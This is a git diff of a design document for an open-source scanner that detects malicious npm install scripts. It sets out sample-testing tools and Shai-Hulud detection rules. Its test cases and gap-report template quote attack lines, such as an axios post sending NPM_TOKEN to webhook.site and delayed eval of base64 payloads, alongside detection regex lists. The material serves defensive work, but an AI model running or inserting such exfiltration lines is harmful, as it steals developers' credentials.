@@ -1,446 +1,683 @@
-# Dev Trust Scanner — Architecture Decisions & Implementation Guide
+Decision Document: Phase 2 Sample Testing Framework & Tier 1 Detection Rules
+Date: 2025-02-07
+Status: APPROVED
+Scope: Phase 2 architecture for continuous threat sample evaluation + Tier 1 detection capabilities
 
-> **Purpose**: This document is the single source of truth for architectural decisions and implementation instructions. Claude Code should reference this file before writing any code. Update this file as decisions evolve.
+Executive Summary
+Phase 1 delivered a production-ready scanner with solid fundamentals (94% coverage, plugin architecture, multi-format reporting). Phase 2 shifts focus to empirical validation against real-world malware samples from opensourcemalware.com.
+This decision document defines:
 
-This project was born from the claude conversation linked below:
-https://claude.ai/share/4cab6c0a-0f09-4240-8863-1b1334239682
+Sample Testing Framework: Architecture for acquiring, safely handling, and continuously evaluating threat samples
+Tier 1 Detection Rules: High-impact, low-false-positive rules targeting active Shai-Hulud campaign patterns
+Gap Analysis Workflow: Systematic methodology for identifying and closing detection gaps
 
----
 
-## Project Overview
+1. Sample Testing Framework Architecture
+1.1 Design Principles
+Automated Threat Intelligence Integration
 
-**Dev Trust Scanner** is an open-source, plugin-based CLI tool that detects malicious patterns in developer tooling configurations. It targets "developer autopilot moments" — attack surfaces where code executes without developer scrutiny.
+Pull samples from opensourcemalware.com tagged with relevant campaigns
+Track provenance (sample ID, source URL, tags, campaign name, fetch date)
+Maintain both malicious corpus and known-good validation set
 
-**Repository structure target:**
+Safe Handling
 
-```
+Never execute samples - static analysis only
+Store samples outside git repository (.gitignore all sample directories)
+Neutered versions only in committed test fixtures (tokens removed, domains replaced)
+Sandboxed environment for manual analysis (disposable VM/container)
+
+Continuous Validation
+
+Weekly automated runs against full corpus
+Regression testing as rules evolve
+Track detection rates over time (CSV metrics)
+Compare scanner findings to published threat intelligence
+
+Gap-Driven Development
+
+Document every missed sample with manual analysis
+Extract patterns for new detection rules
+Validate new rules against known-good packages before deployment
+Update test suite with malware-derived test cases
+
+1.2 Directory Structure
 dev-trust-scanner/
-├── src/
-│   └── dev_trust_scanner/
-│       ├── __init__.py
-│       ├── cli.py                 # Click-based CLI entry point
-│       ├── core/
-│       │   ├── __init__.py
-│       │   ├── orchestrator.py    # Plugin discovery, execution, result aggregation
-│       │   ├── models.py          # Pydantic models: Finding, Rule, ScanResult, Severity
-│       │   ├── plugin.py          # Abstract base class (ABC) for all plugins
-│       │   ├── reporting.py       # Output formatters: JSON, SARIF, text
-│       │   └── static_analysis.py # Shared utilities: entropy, base64, regex, AST helpers
-│       └── plugins/
-│           ├── __init__.py
-│           ├── npm_lifecycle/
-│           │   ├── __init__.py
-│           │   ├── scanner.py     # NpmLifecyclePlugin(BasePlugin)
-│           │   └── rules/
-│           │       └── npm_rules.yaml
-│           └── vscode_tasks/
-│               ├── __init__.py
-│               ├── scanner.py     # VsCodeTasksPlugin(BasePlugin)
-│               └── rules/
-│                   └── vscode_rules.yaml
-├── tests/
-│   ├── conftest.py                # Shared fixtures, sample malicious configs
-│   ├── test_orchestrator.py
-│   ├── test_static_analysis.py
-│   ├── test_npm_lifecycle.py
-│   └── test_vscode_tasks.py
-├── rules/
-│   └── shared/
-│       └── ioc_patterns.yaml      # Cross-plugin IOCs (domains, IPs, patterns)
-├── docs/
-│   └── decisions.md               # THIS FILE
-├── pyproject.toml
-├── README.md
-└── LICENSE                        # MIT
-```
+├── samples/                          # NOT in git (.gitignore)
+│   ├── malicious/                    # Real malware samples
+│   │   ├── shai-hulud/               # Campaign-organized
+│   │   │   ├── sample-001/           # Individual packages
+│   │   │   └── sample-002/
+│   │   ├── contagious-interview/
+│   │   └── metadata.json             # Sample provenance tracking
+│   └── known-good/                   # Validation set
+│       ├── react/                    # Top npm packages
+│       ├── lodash/
+│       └── metadata.json
+├── tools/
+│   ├── fetch_samples.py              # Download/import samples
+│   ├── validate_samples.py           # Run scanner against corpus
+│   ├── gap_analysis.py               # Compare results to known-malicious
+│   └── neuter_sample.py              # Sanitize for test fixtures
+├── analysis/
+│   ├── gap-reports/                  # Per-sample miss analysis
+│   │   └── 2025-02-10-sample-sha1-hulud-v2.md
+│   ├── validation-reports/           # Weekly test runs
+│   │   └── 2025-02-10-validation.json
+│   └── metrics/                      # Historical tracking
+│       └── detection-rates.csv       # Time-series data
+└── tests/
+    └── fixtures/
+        ├── malicious/                # Neutered samples for unit tests
+        │   └── shai-hulud-neutered/  # Tokens removed, safe to commit
+        └── known-good/               # Legitimate code patterns
+1.3 Component Specifications
+tools/fetch_samples.py
+Purpose: Acquire samples and manage corpus
+Features:
 
----
+Manual Import Mode (Phase 2.1): Import locally downloaded samples from opensourcemalware.com
 
-## Decision Log
+import-sample command with campaign/tags/sample-id parameters
+Validates sample structure (package.json present, etc.)
+Records metadata in metadata.json
 
-### DEC-001: Python Package Layout — `src/` Layout
 
-**Decision**: Use `src/dev_trust_scanner/` layout, not flat layout.
+Known-Good Fetcher: Download top-N npm packages for validation
 
-**Rationale**: Prevents accidental imports from the working directory during development. Standard for modern Python packages. Ensures tests import the installed package, not local files.
+Uses npm registry API to fetch popular packages
+Default top-100 for false-positive testing
+Tracks as separate "validation-set" campaign
 
-**Implication**: All imports use `from dev_trust_scanner.core import ...`
 
----
+Future: OSM API Integration (when available)
 
-### DEC-002: Data Models — Pydantic v2
+Direct fetch with tag filtering
+Automated weekly pulls via cron/GitHub Actions
 
-**Decision**: Use Pydantic v2 `BaseModel` for all data structures (`Finding`, `Rule`, `ScanResult`, `Severity`).
 
-**Rationale**: Type validation, JSON serialization for free, clear contracts between plugins and core. Pydantic v2 is significantly faster than v1.
 
-**Models to implement:**
-
-```python
-from enum import Enum
-from pydantic import BaseModel
-from typing import Optional
-from pathlib import Path
-
-class Severity(str, Enum):
-    CRITICAL = "critical"   # Active exploitation pattern (e.g., known malware signature)
-    HIGH = "high"           # Strong malicious indicators (e.g., obfuscated eval + network call)
-    MEDIUM = "medium"       # Suspicious patterns (e.g., base64 in lifecycle script)
-    LOW = "low"             # Informational (e.g., lifecycle script exists but looks benign)
-
-class Finding(BaseModel):
-    rule_id: str                     # e.g., "NPM-001"
-    rule_name: str                   # Human-readable name
-    severity: Severity
-    file_path: Path                  # Relative to scan target
-    line_number: Optional[int] = None
-    matched_content: str             # The suspicious content found
-    description: str                 # What was detected and why it matters
-    recommendation: str              # What the developer should do
-    plugin_name: str                 # Which plugin produced this finding
-
-class Rule(BaseModel):
-    id: str
-    name: str
-    severity: Severity
-    description: str
-    pattern: Optional[str] = None         # Regex pattern
-    patterns: Optional[list[str]] = None  # Multiple regex patterns (match any)
-    keywords: Optional[list[str]] = None  # Simple string matching
-    recommendation: str
-
-class ScanResult(BaseModel):
-    target_path: Path
-    findings: list[Finding]
-    plugins_run: list[str]
-    scan_duration_seconds: float
-    summary: dict                    # e.g., {"critical": 0, "high": 2, "medium": 1, "low": 0}
-```
-
----
-
-### DEC-003: Plugin Interface — ABC with Three Methods
-
-**Decision**: Plugins extend `BasePlugin` ABC with exactly three required methods.
-
-**Rationale**: Minimal contract = easy contribution. Plugins stay independent and testable.
-
-```python
-from abc import ABC, abstractmethod
-from pathlib import Path
-
-class BasePlugin(ABC):
-    @abstractmethod
-    def scan(self, target_path: Path) -> list[Finding]:
-        """Run all detection logic against the target directory. Return findings."""
-        ...
-
-    @abstractmethod
-    def get_metadata(self) -> dict:
-        """Return plugin metadata: name, version, author, description."""
-        ...
-
-    @abstractmethod
-    def get_supported_files(self) -> list[str]:
-        """Return glob patterns for files this plugin inspects.
-        Examples: ['package.json'], ['.vscode/tasks.json']
-        """
-        ...
-```
-
-**Plugin discovery**: Orchestrator imports from `dev_trust_scanner.plugins` using a registry pattern. Each plugin's `__init__.py` exposes a `PLUGIN_CLASS` variable pointing to the scanner class. No magic autodiscovery — explicit is better.
-
-```python
-# plugins/npm_lifecycle/__init__.py
-from .scanner import NpmLifecyclePlugin
-PLUGIN_CLASS = NpmLifecyclePlugin
-```
-
-```python
-# core/orchestrator.py — plugin registry
-PLUGIN_REGISTRY = {
-    "npm-lifecycle": "dev_trust_scanner.plugins.npm_lifecycle",
-    "vscode-tasks": "dev_trust_scanner.plugins.vscode_tasks",
+Metadata Schema:
+json{
+  "samples": [
+    {
+      "sample_id": "sha1-hulud-variant-2",
+      "source": "https://opensourcemalware.com/sample/xyz",
+      "tags": ["shai-hulud", "npm-worm"],
+      "campaign": "shai-hulud",
+      "sha256": "abc123...",
+      "fetched_at": "2025-02-07T10:30:00Z",
+      "known_malicious": true,
+      "references": [
+        "https://reversinglabs.com/blog/shai-hulud-analysis"
+      ]
+    }
+  ]
 }
-```
+CLI Examples:
+bash# Import manually downloaded sample
+python tools/fetch_samples.py import-sample \
+    ~/Downloads/malicious-pkg/ \
+    --campaign shai-hulud \
+    --tags shai-hulud,npm-worm \
+    --sample-id sha1-hulud-v2
 
----
+# Fetch validation set
+python tools/fetch_samples.py fetch-known-good --top-n 100
 
-### DEC-004: Rule Format — YAML with Defined Schema
+# Future: Direct fetch
+python tools/fetch_samples.py fetch-malicious --tags shai-hulud --limit 20
+tools/validate_samples.py
+Purpose: Run scanner against corpus and generate validation reports
+Features:
 
-**Decision**: Rules are YAML files loaded by each plugin at scan time.
+Corpus Scanning: Iterate through all samples in samples/malicious/ or samples/known-good/
+Result Comparison: Match scanner findings against known-malicious metadata
+Detection Metrics:
 
-**Rationale**: Human-readable, easy to contribute, no code changes needed for new rules. Security teams can write rules without Python knowledge.
+Total samples scanned
+Detected (findings > 0)
+Missed (known-malicious with no findings)
+False positives (known-good with findings)
+Detection rate percentage
 
-**Schema example:**
 
+Report Formats:
+
+JSON: Machine-readable for CI/metrics tracking
+Markdown: Human-readable summary for weekly reviews
+CSV: Time-series metrics for trend analysis
+
+
+
+Output Schema (validation-reports/YYYY-MM-DD-validation.json):
+json{
+  "scan_date": "2025-02-10T14:00:00Z",
+  "scanner_version": "0.2.0",
+  "corpus": {
+    "malicious_samples": 47,
+    "known_good_samples": 100
+  },
+  "results": {
+    "detected": 38,
+    "missed": 9,
+    "false_positives": 2,
+    "detection_rate": 0.809
+  },
+  "missed_samples": [
+    {
+      "sample_id": "shai-hulud-v3",
+      "campaign": "shai-hulud",
+      "reason": "novel_obfuscation"
+    }
+  ],
+  "false_positives": [
+    {
+      "sample_id": "crypto-js",
+      "findings": ["high_entropy"],
+      "severity": "low"
+    }
+  ]
+}
+CLI Examples:
+bash# Scan all malicious samples
+python tools/validate_samples.py --malicious --output analysis/validation-reports/
+
+# Scan validation set for false positives
+python tools/validate_samples.py --known-good
+
+# Full corpus scan with metric tracking
+python tools/validate_samples.py --all --update-metrics
+tools/gap_analysis.py
+Purpose: Generate detailed analysis for missed samples
+Features:
+
+Interactive Mode: Prompt analyst to review missed samples
+Template Generation: Create gap-report markdown with pre-filled metadata
+Pattern Extraction: Suggest potential detection rules based on manual findings
+IOC Extraction: Pull domains, file patterns, code signatures from sample
+
+Gap Report Template (analysis/gap-reports/YYYY-MM-DD-sample-{id}.md):
+markdown# Gap Analysis: {sample_id}
+
+**Date**: 2025-02-10  
+**Campaign**: shai-hulud  
+**Sample Source**: https://opensourcemalware.com/sample/xyz  
+**Published Intel**: [ReversingLabs report](https://...)
+
+## Scanner Result
+- **Findings**: None
+- **Expected Detection**: High (known-malicious sample)
+
+## Manual Analysis
+
+### Obfuscation Techniques
+- Double base64 encoding: `btoa(btoa(payload))`
+- Hex escape sequences in variable names
+- Dynamic property access: `process['en'+'v']`
+
+### Execution Flow
+1. Install hook: `preinstall` script
+2. Delayed execution: `setTimeout(() => eval(...), 5000)`
+3. Network exfiltration: `axios.post('https://webhook.site/xxx', secrets)`
+
+### Key Indicators
+- **Domains**: webhook.site, pastebin.com
+- **Files**: bun_installer.js, 3nvir0nm3nt.json
+- **Markers**: "Goldox-T3chs" in comments
+
+## Detection Gaps
+
+### Primary Gap
+Current rules don't detect delayed execution patterns (`setTimeout` + `eval`)
+
+### Secondary Gaps
+- Missing axios + process.env correlation
+- No webhook.site domain check
+- Doesn't flag campaign markers in comments
+
+## Proposed Rules
+
+### Rule 1: Delayed Execution + Eval
 ```yaml
-rules:
-  - id: "NPM-001"
-    name: "Suspicious postinstall script"
-    severity: "high"
-    description: "postinstall script contains patterns associated with supply chain attacks"
-    patterns:
-      - "eval\\s*\\("
-      - "Function\\s*\\("
-      - "child_process"
-      - "\\bexec\\b"
-    recommendation: "Review the postinstall script manually. Remove if not needed."
-
-  - id: "NPM-002"
-    name: "Base64 encoded content in lifecycle script"
-    severity: "high"
-    description: "Base64 encoding in npm scripts is commonly used to obfuscate malicious payloads"
-    patterns:
-      - "atob\\s*\\("
-      - "Buffer\\.from\\s*\\([^)]+,\\s*['\"]base64['\"]"
-      - "[A-Za-z0-9+/]{40,}={0,2}"
-    recommendation: "Decode and inspect the base64 content before running."
+id: NPM-LC-005
+pattern: setTimeout.*eval|setInterval.*eval
+severity: high
+confidence: high
 ```
 
----
-
-### DEC-005: Static Analysis Utilities — Shared Module
-
-**Decision**: Common detection functions live in `core/static_analysis.py`, shared across all plugins.
-
-**Functions to implement:**
-
-| Function | Purpose | Used By |
-|---|---|---|
-| `detect_base64(text) -> list[Match]` | Find base64-encoded strings above length threshold | npm, vscode |
-| `detect_obfuscation(text) -> list[Match]` | Hex escapes, char code building, string concat obfuscation | npm, vscode |
-| `calculate_entropy(text) -> float` | Shannon entropy — high entropy = possible encoded/encrypted content | All |
-| `check_ioc_patterns(text, iocs) -> list[Match]` | Match against known malicious domains/IPs/URLs | All |
-| `detect_suspicious_commands(text) -> list[Match]` | curl\|wget piped to sh, PowerShell download cradles, etc. | All |
-| `match_rules(text, rules) -> list[Finding]` | Apply YAML rule patterns against text content | All |
-
-**Match is a simple dataclass:**
-
-```python
-@dataclass
-class Match:
-    pattern_name: str
-    matched_text: str
-    start_position: int
-    end_position: int
-    line_number: Optional[int] = None
+### Rule 2: Exfiltration Domain List
+```yaml
+id: NPM-NET-003
+domains:
+  - webhook.site
+  - requestbin.com
+context: network_call + env_access
 ```
 
----
+## Validation Plan
+- [ ] Test Rule 1 against top-100 npm (check for false positives)
+- [ ] Add neutered sample to test fixtures
+- [ ] Re-run against this sample (verify detection)
+- [ ] Update metrics
+CLI Examples:
+bash# Generate gap report for specific sample
+python tools/gap_analysis.py --sample-id sha1-hulud-v3 --interactive
+
+# Batch mode for all missed samples from last validation
+python tools/gap_analysis.py --from-validation analysis/validation-reports/2025-02-10-validation.json
+tools/neuter_sample.py
+Purpose: Sanitize malicious samples for safe test fixture commits
+Features:
+
+Token Removal: Strip actual tokens, API keys, secrets
+Domain Replacement: Replace exfiltration domains with example.com
+Comment Injection: Add WARNING headers to files
+Structure Preservation: Keep obfuscation/patterns intact for detection testing
+
+Safety Transformations:
+javascript// BEFORE (malicious)
+const token = process.env.NPM_TOKEN;
+axios.post('https://webhook.site/xyz', { token });
+
+// AFTER (neutered)
+// WARNING: This is a neutered malware sample for testing purposes only
+// Original sample: shai-hulud-v2 from opensourcemalware.com
+const token = process.env.NPM_TOKEN;
+axios.post('https://example.com/neutered', { token: 'REDACTED' });
+CLI Examples:
+bash# Neuter sample for test fixtures
+python tools/neuter_sample.py \
+    samples/malicious/shai-hulud/sample-001/ \
+    tests/fixtures/malicious/shai-hulud-neutered/ \
+    --remove-tokens --replace-domains
+1.4 Metrics Tracking
+Time-Series CSV (analysis/metrics/detection-rates.csv):
+csvdate,total_samples,detected,missed,detection_rate,false_positives,scanner_version
+2025-02-10,47,38,9,0.809,2,0.2.0
+2025-02-17,52,44,8,0.846,1,0.2.1
+Visualization: Weekly chart showing detection rate trend over time
+1.5 Weekly Workflow
+Monday: Sample Acquisition
+bash# Download new samples from opensourcemalware.com (manual for now)
+# Import into corpus
+python tools/fetch_samples.py import-sample ...
+Tuesday-Thursday: Gap Analysis & Rule Development
+bash# Run validation scan
+python tools/validate_samples.py --all --output analysis/validation-reports/
+
+# Analyze missed samples
+python tools/gap_analysis.py --from-validation analysis/validation-reports/latest.json
+
+# Develop new rules (manual work in rules/*.yml)
+
+# Test new rules
+pytest tests/ -v
+Friday: Validation & Commit
+bash# Re-run full validation
+python tools/validate_samples.py --all --update-metrics
+
+# Check false positive rate
+python tools/validate_samples.py --known-good
+
+# Commit if metrics improve
+git add rules/ tests/ analysis/metrics/
+git commit -m "Add NPM-LC-005: delayed execution detection (detection rate: 81% → 85%)"
+
+2. Tier 1 Detection Rules
+2.1 Rule Metadata Schema
+Standardize all rules with metadata for campaign tracking and confidence scoring:
+yaml# rules/npm-lifecycle/trufflehog-download.yml
+metadata:
+  id: NPM-LC-001
+  created: 2025-02-07
+  updated: 2025-02-07
+  campaign: shai-hulud
+  confidence: high  # high|medium|low
+  severity: critical  # critical|high|medium|low
+  false_positive_rate: 0.0  # Measured against top-1000 npm
+  references:
+    - https://opensourcemalware.com/sample/xyz
+    - https://reversinglabs.com/blog/shai-hulud
+  mitre_attack:
+    - T1195.002  # Supply Chain Compromise: Compromise Software Supply Chain
+    - T1552.001  # Credentials from Files
+
+detection:
+  patterns:
+    - trufflesecurity/trufflehog
+    - download.*trufflehog
+  context:
+    - install_script  # Must be in package.json scripts
+  severity_modifiers:
+    - high: contains "releases/download"
+    - critical: contains "releases/download" AND env_access
+
+description: |
+  Detects downloads of TruffleHog secret scanner binary during package installation.
+  This is a signature behavior of Shai-Hulud npm worm variants that scan for secrets
+  to facilitate propagation via stolen npm tokens.
+2.2 Tier 1 Rules (Week 1-2 Priority)
+NPM-LC-001: TruffleHog Binary Download
+Target: Shai-Hulud propagation mechanism
+Confidence: High (legitimate packages don't download secret scanners)
+Expected False Positive Rate: <0.01%
+Detection Logic:
+yamlpatterns:
+  - regex: trufflesecurity/trufflehog.*/releases
+  - regex: download.*trufflehog(\.exe)?
+context:
+  location: [preinstall, postinstall, install]
+  file_write: [trufflehog, trufflehog.exe]
+Test Cases:
+
+✅ Detect: curl -L https://github.com/trufflesecurity/trufflehog/releases/download/v3.0.0/trufflehog_linux -o trufflehog
+✅ Detect: wget trufflesecurity/trufflehog/releases/latest
+❌ Ignore: Legitimate dependency on @trufflesecurity/trufflehog npm package (different pattern)
+
+
+NPM-LC-002: GitHub Actions Workflow Injection
+Target: Shai-Hulud persistence/propagation
+Confidence: High
+Expected False Positive Rate: <0.01%
+Detection Logic:
+yamlpatterns:
+  - file_creation: .github/workflows/*.yml
+  - regex: shai-hulud-workflow|goldox.*workflow
+context:
+  location: [preinstall, postinstall, install]
+  file_operations: write
+Test Cases:
+
+✅ Detect: Install script creates .github/workflows/shai-hulud-workflow.yml
+✅ Detect: Workflow file contains suspicious uses: from forked repos
+❌ Ignore: Package includes legitimate .github/workflows/ in distributed files (not created by install script)
+
+
+NPM-LC-003: Campaign Marker Strings
+Target: Shai-Hulud variants identification
+Confidence: High
+Expected False Positive Rate: 0% (strings are unique to malware)
+Detection Logic:
+yamlpatterns:
+  - regex: shai-hulud|sha1-hulud.*second coming
+  - regex: goldox-t3chs.*only happy girl
+  - regex: _sha1_hulud_|_goldox_
+context:
+  location: [comments, strings, variable_names]
+Test Cases:
+
+✅ Detect: // Shai-Hulud: The Second Coming
+✅ Detect: const marker = "Goldox-T3chs: Only Happy Girl"
+✅ Detect: Repository description contains these strings
+❌ No false positives expected (these are malware-specific markers)
+
+
+NPM-LC-004: Webhook Exfiltration Pattern
+Target: Data exfiltration to webhook.site, requestbin
+Confidence: Medium (some legitimate testing uses these)
+Expected False Positive Rate: <0.1%
+Detection Logic:
+yamlpatterns:
+  - regex: webhook\.site|requestbin\.com|pipedream\.net
+context:
+  network_call: [POST, GET]
+  env_access: true  # Must also access environment variables
+  location: [preinstall, postinstall, install]
+severity_modifiers:
+  - medium: webhook domain only
+  - high: webhook + env_access
+  - critical: webhook + env_access + obfuscation
+Test Cases:
+
+✅ Detect: axios.post('https://webhook.site/xyz', { token: process.env.NPM_TOKEN })
+✅ Detect: fetch('https://requestbin.com/abc').then(...)
+⚠️ Low-severity: Test file uses webhook.site (context: tests/, not install script)
+❌ Ignore: Documentation mentions webhook.site as example
+
+
+NPM-LC-005: Delayed Execution + Eval
+Target: Evasion technique observed in Shai-Hulud v3
+Confidence: Medium (some legitimate uses exist)
+Expected False Positive Rate: <1%
+Detection Logic:
+yamlpatterns:
+  - regex: setTimeout\s*\(.*eval
+  - regex: setInterval\s*\(.*eval
+  - regex: setTimeout\s*\(.*Function\s*\(
+context:
+  location: [preinstall, postinstall, install]
+severity_modifiers:
+  - low: in development dependencies
+  - medium: in install scripts
+  - high: with obfuscation (base64/hex)
+Test Cases:
+
+✅ Detect: setTimeout(() => eval(atob('...')), 5000)
+✅ Detect: setInterval(function() { new Function(payload)() }, 1000)
+❌ Ignore: Browser polyfill in src/ directory
+⚠️ Low-severity: setTimeout + eval in test files
+
+
+NPM-LC-006: Multi-File Payload Correlation
+Target: Obfuscation via file splitting
+Confidence: Medium
+Expected False Positive Rate: <0.5%
+Detection Logic:
+yamldetection_type: correlation  # New type - requires plugin enhancement
+patterns:
+  - file_pairs:
+      - [bun_installer.js, environment_source.js]
+      - [*_installer.js, *nvir0nm3nt.json]
+  - shared_obfuscation_key: true
+context:
+  both_files:
+    - base64_strings: true
+    - network_calls: true
+Implementation Note: Requires new plugin capability to track patterns across multiple files in same package.
+Test Cases:
+
+✅ Detect: Package has bun_installer.js + 3nvir0nm3nt.json with matching base64 keys
+✅ Detect: Both files use same unusual variable naming pattern
+❌ Ignore: Legitimate multi-file packages with different purposes
+
+
+2.3 Rule Validation Requirements
+Before Deploying Any New Rule:
+
+Unit Tests: Add test case to tests/test_rules.py
+
+python   def test_npm_lc_001_trufflehog_download():
+       malicious_code = """
+       curl -L https://github.com/trufflesecurity/trufflehog/releases/download/v3.0.0/trufflehog -o trufflehog
+       """
+       findings = scan_code(malicious_code)
+       assert any(f.rule_id == "NPM-LC-001" for f in findings)
+
+Malware Sample Validation: Test against actual Shai-Hulud samples
+
+bash   python tools/validate_samples.py --sample samples/malicious/shai-hulud/sample-001/
+   # Should detect with new rule
+
+False Positive Check: Run against top-100 npm packages
+
+bash   python tools/validate_samples.py --known-good --rule NPM-LC-001
+   # Should report FP rate < 1%
+
+Neutered Test Fixture: Add sanitized sample to test suite
+
+bash   python tools/neuter_sample.py \
+       samples/malicious/shai-hulud/sample-001/ \
+       tests/fixtures/malicious/npm-lc-001-trufflehog/
+
+Documentation: Update rule in rules/ with metadata and references
+
+
+3. Implementation Roadmap
+Week 1: Foundation
+
+ Implement tools/fetch_samples.py with manual import + known-good fetcher
+ Implement tools/validate_samples.py with JSON/MD/CSV reporting
+ Create directory structure (samples/, analysis/, .gitignore)
+ Fetch top-100 npm packages for validation baseline
+ Manually import 5-10 Shai-Hulud samples from opensourcemalware.com
+
+Week 2: Tier 1 Rules
+
+ Implement NPM-LC-001 (TruffleHog download)
+ Implement NPM-LC-002 (GitHub Actions injection)
+ Implement NPM-LC-003 (Campaign markers)
+ Add rule metadata schema to all rules
+ Run first full validation scan, generate baseline metrics
+
+Week 3: Gap Analysis
+
+ Implement tools/gap_analysis.py with interactive mode
+ Analyze missed samples from Week 2 validation
+ Implement NPM-LC-004 (Webhook exfiltration)
+ Implement NPM-LC-005 (Delayed execution)
+ Document first gap report
+
+Week 4: Validation & Refinement
+
+ Implement tools/neuter_sample.py
+ Add neutered samples to test fixtures
+ Test NPM-LC-006 (Multi-file correlation) feasibility
+ Run weekly validation, update metrics
+ Publish Phase 2 progress in README
+
+
+4. Success Criteria
+Quantitative:
+
+✅ Detection rate >80% on Shai-Hulud tagged samples
+✅ False positive rate <1% on top-100 npm packages
+✅ 6 Tier 1 rules deployed with metadata
+✅ Weekly validation reports generated
+✅ Time-series metrics tracking operational
+
+Qualitative:
+
+✅ Can reproduce detection claims (sample ID → findings)
+✅ Gap analysis workflow documented and practiced
+✅ Safe handling protocols followed (no sample execution)
+✅ Rules cover active campaign TTPs (not just historical IOCs)
+
 
-### DEC-006: CLI Design — Click with Sensible Defaults
+5. Technical Decisions
+5.1 Sample Storage
+Decision: Store samples outside git repository
+Rationale:
 
-**Decision**: Click framework, subcommand structure, sensible defaults for zero-config scanning.
+Avoid accidental distribution of malware
+Keep repo size manageable
+Allow analysts to maintain private sample collections
 
-```
-# Scan current directory with all plugins
-dev-trust-scan .
-
-# Scan with specific plugin
-dev-trust-scan . --plugin npm-lifecycle
-
-# Output formats
-dev-trust-scan . --format json
-dev-trust-scan . --format sarif
-dev-trust-scan . --format text  (default)
-
-# Verbosity
-dev-trust-scan . -v        # Show info messages
-dev-trust-scan . -vv       # Debug output
-
-# List available plugins
-dev-trust-scan --list-plugins
-```
-
-**Exit codes**: 0 = no findings, 1 = findings detected, 2 = scan error. This enables CI/CD gating.
-
----
-
-### DEC-007: Output Formats — Three Tiers
-
-**Decision**: Support JSON, SARIF, and human-readable text output.
-
-**Priority order for MVP**: text first (usable immediately), JSON second (scriptable), SARIF third (CI/CD integration).
-
-**Text output example:**
-
-```
-🔍 Dev Trust Scanner v0.1.0
-Scanning: /path/to/project
-Plugins: npm-lifecycle, vscode-tasks
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔴 HIGH: Suspicious postinstall script [NPM-001]
-   File: package.json (line 12)
-   Match: "node -e \"eval(Buffer.from('...', 'base64'))\""
-   → Review the postinstall script manually. Remove if not needed.
-
-🟡 MEDIUM: Base64 content in lifecycle script [NPM-002]
-   File: package.json (line 14)
-   Match: "aG9zdG5hbWU="
-   → Decode and inspect the base64 content before running.
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-Summary: 1 high, 1 medium, 0 low | 2 findings in 0.03s
-```
-
----
-
-### DEC-008: Testing Strategy
-
-**Decision**: pytest with fixture-based test data. Each plugin gets its own malicious sample fixtures.
-
-**Test structure:**
-
-- `conftest.py`: Shared fixtures that create temporary directories with malicious config files
-- Each plugin test: Create realistic malicious configs, run scanner, assert expected findings
-- Static analysis tests: Unit tests for each utility function
-
-**Sample fixture approach:**
-
-```python
-@pytest.fixture
-def malicious_package_json(tmp_path):
-    pkg = tmp_path / "package.json"
-    pkg.write_text(json.dumps({
-        "name": "legit-looking-package",
-        "scripts": {
-            "postinstall": "node -e \"eval(Buffer.from('bWFsaWNpb3Vz','base64').toString())\""
-        }
-    }))
-    return tmp_path
-```
-
-**Coverage target for MVP**: Core and static analysis at 80%+. Plugin tests cover each rule firing at least once.
-
----
-
-### DEC-009: Error Handling Philosophy
-
-**Decision**: Scan should never crash on malformed input. Log warnings, skip unparseable files, continue scanning.
-
-**Rationale**: Real-world projects have broken configs. A scanner that crashes on bad JSON is useless.
-
-**Implementation**: Each plugin wraps its `scan()` in try/except, logs errors, returns partial results. Orchestrator collects errors into the ScanResult for transparency.
-
----
-
-### DEC-010: Dependency Policy — Minimal
-
-**Decision**: Keep dependencies minimal for security credibility and ease of installation.
-
-**Allowed dependencies:**
-
-- `click` — CLI framework
-- `pydantic` — Data validation
-- `pyyaml` — Rule loading
-- `rich` — Terminal output formatting (text reporter only)
-
-**Dev dependencies:**
-
-- `pytest`
-- `pytest-cov`
-
-**No dependencies on**: requests, httpx, or any network library. This is a static analysis tool — it should never phone home.
-
----
-
-## Implementation Order for Claude Code
-
-**Follow this exact sequence. Do not skip ahead. Commit after each step.**
-
-### Step 1: Project Scaffolding
-
-Create the full directory structure, `pyproject.toml`, empty `__init__.py` files. Ensure `pip install -e .` works.
-
-`pyproject.toml` must include:
-- Project name: `dev-trust-scanner`
-- Entry point: `dev-trust-scan = dev_trust_scanner.cli:main`
-- Python >= 3.11
-- Dependencies: click, pydantic, pyyaml, rich
-- Dev dependencies in optional group: pytest, pytest-cov
-
-### Step 2: Core Models (`core/models.py`)
-
-Implement `Severity`, `Finding`, `Rule`, `ScanResult`, and `Match` exactly as specified in DEC-002 and DEC-005. Write unit tests to verify serialization.
-
-### Step 3: Static Analysis Utilities (`core/static_analysis.py`)
-
-Implement all functions from DEC-005. Write comprehensive unit tests with known-malicious patterns. Test edge cases: empty strings, binary content, extremely long strings.
-
-### Step 4: Plugin Base Class (`core/plugin.py`)
-
-Implement `BasePlugin` ABC as specified in DEC-003. This should be minimal — just the abstract interface.
-
-### Step 5: npm-lifecycle Plugin (`plugins/npm_lifecycle/`)
-
-Implement `NpmLifecyclePlugin`:
-1. Write `npm_rules.yaml` first (minimum 5 rules)
-2. Implement `scanner.py` — parse package.json, extract lifecycle scripts, run rules + static analysis
-3. Write tests with realistic malicious samples
-
-**Target rules (minimum):**
-- NPM-001: Suspicious eval/exec in lifecycle scripts
-- NPM-002: Base64 encoded content in scripts
-- NPM-003: Network calls in lifecycle scripts (curl, wget, http)
-- NPM-004: Environment variable access/exfiltration
-- NPM-005: File system operations outside expected paths
-
-### Step 6: vscode-tasks Plugin (`plugins/vscode_tasks/`)
-
-Implement `VsCodeTasksPlugin`:
-1. Write `vscode_rules.yaml` first (minimum 4 rules)
-2. Implement `scanner.py` — parse tasks.json, check for auto-execution, run rules
-3. Write tests with realistic Contagious Interview-style samples
-
-**Target rules (minimum):**
-- VSC-001: Auto-executing tasks (runOn: folderOpen)
-- VSC-002: Obfuscated commands in tasks
-- VSC-003: Shell commands with suspicious patterns
-- VSC-004: Hidden task configurations (presentation.reveal: never)
-
-### Step 7: Orchestrator (`core/orchestrator.py`)
-
-Wire up plugin discovery, execution, and result aggregation. Handle plugin failures gracefully per DEC-009.
-
-### Step 8: Reporting (`core/reporting.py`)
-
-Implement text formatter first (with rich), then JSON, then SARIF stub.
-
-### Step 9: CLI (`cli.py`)
-
-Wire everything together with Click. Implement commands from DEC-006. Test manually.
-
-### Step 10: Integration Tests
-
-End-to-end tests: CLI invocation → scan → output verification. Test with both clean and malicious project fixtures.
-
----
-
-## Coding Standards for Claude Code
-
